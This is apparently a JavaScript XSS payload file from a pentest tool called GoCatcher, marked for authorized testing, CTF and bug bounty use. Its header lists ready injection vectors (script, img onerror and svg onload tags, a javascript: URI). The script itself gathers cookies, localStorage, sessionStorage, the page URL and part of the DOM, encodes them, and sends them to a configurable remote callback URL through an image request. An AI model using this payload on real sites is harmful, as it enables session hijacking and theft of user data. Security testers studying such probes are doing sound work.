/* ===========================================================================
 * GoCatcher :: XSS probe  (application/javascript)
 * FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
 *
 * Usage: get this script to execute on the target via an XSS sink, e.g.
 *   <script src="http://127.0.0.1:8080/xss"></script>
 *   "><script src=http://127.0.0.1:8080/xss></script>
 * When it runs it beacons context back to GoCatcher's /collect endpoint,
 * which the catch-all logs (method, path, query, headers).
 *
 * Replace 127.0.0.1:8080 with your --serveo / EC2 URL for remote targets.
 *
 * Raw reflected/stored injection vectors to try first:
 *   <script>alert(document.domain)</script>
 *   <img src=x onerror=alert(document.domain)>
 *   <svg/onload=alert(document.domain)>
 *   "><svg onload=import('http://127.0.0.1:8080/xss')>
 *   javascript:alert(document.domain)
 *   '"><iframe src=javascript:alert(document.domain)>
 * =========================================================================== */
(function () {
  var CATCHER = "{{callback_url}}/collect";
  function send(obj) {
    try {
      var p = btoa(unescape(encodeURIComponent(JSON.stringify(obj))));
      new Image().src = CATCHER + "?b=" + encodeURIComponent(p);
    } catch (e) {
      new Image().src = CATCHER + "?err=" + encodeURIComponent(String(e));
    }
  }
  send({
    url: location.href,
    origin: location.origin,
    cookie: document.cookie,
    referrer: document.referrer,
    ua: navigator.userAgent,
    localStorage: (function () { try { return JSON.stringify(window.localStorage); } catch (e) { return null; } })(),
    sessionStorage: (function () { try { return JSON.stringify(window.sessionStorage); } catch (e) { return null; } })(),
    domSnippet: document.documentElement.outerHTML.slice(0, 2048)
  });
})();
